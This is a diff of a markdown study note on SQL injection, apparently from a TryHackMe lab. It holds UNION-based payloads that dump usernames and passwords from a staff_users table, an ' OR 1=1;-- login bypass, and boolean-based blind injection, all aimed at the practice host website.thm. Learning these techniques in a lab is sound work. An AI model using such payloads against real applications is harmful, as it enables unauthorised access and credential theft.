@@ -1,4 +1,4 @@
-Attack on a web application database server that causes malicious queries to be executed.
+b bAttack on a web application database server that causes malicious queries to be executed.
 
 A Database is a way of electronically **storing collections of data in an organised manner**, a database is controlled by a **DBMS**, which is an acronym for **Database Management System**.
 
@@ -177,4 +177,57 @@ We're interested in listing all the tables in the **sqli_one** database, which i
 ```SQL
 https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
 ```
+
+However the information we want to retrieve has changed from `table_name` to `column_name`
+ the table we are querying in the information_schema database has changed from tables to columns.
+
+```SQL
+https://website.thm/article?id=0 UNION SELECT 1,2, group_concat(username, ':', password SEPARATOR '<br>') FROM staff_users
+```
+
+We've added `':'` to split the username and password from each other.
+
+### Blind SQLi
+
+Blind SQLi is when we get **little to no feedback** to confirm our injected queries were, in fact, successful or not.
+
+**Autentication Bypass**
+Login forms that are connected to a database of users are often developed in such a way that the webapp isn't interested in the content , but more in whether the **two make a matching pair in the users table.**
+
+**Practical**
+
+We can see that the SQL query is this one
+
+```sql
+select * from users where username='%username%' and password='%password%' LIMIT 1;
+```
+
+To make this into a query that always returns true, we can enter the following:
+
+```sql
+' OR 1=1;--
+```
+
+Which turns into this SQL statement
+
+```sql
+select * from users where username='' and password='' OR 1=1;
+```
+
+Because 1=1 is a **true statement** and we've used an OR operator, this will always cause the query to return as true.
+
+### BLind SQLi - Boolean Based
+
+Boolean-based SQL Injection refers to the response we receive from our injection attempts, which is a boolean (successful or not)
+
+``https://website.thm/checkuser?username=admin``
+
+The browser body contains ``{"taken":true}``, this API endpoint replicates a common feature found on many signup forms, which **checks whether a username has already been registered to prompt the user to choose a different username**
+
+```sql
+select * from users where username = '%username%' LIMIT 1;
+```
+
+
+https://medium.com/@Aircon/sql-injection-tryhackme-thm-f712548fc198
 
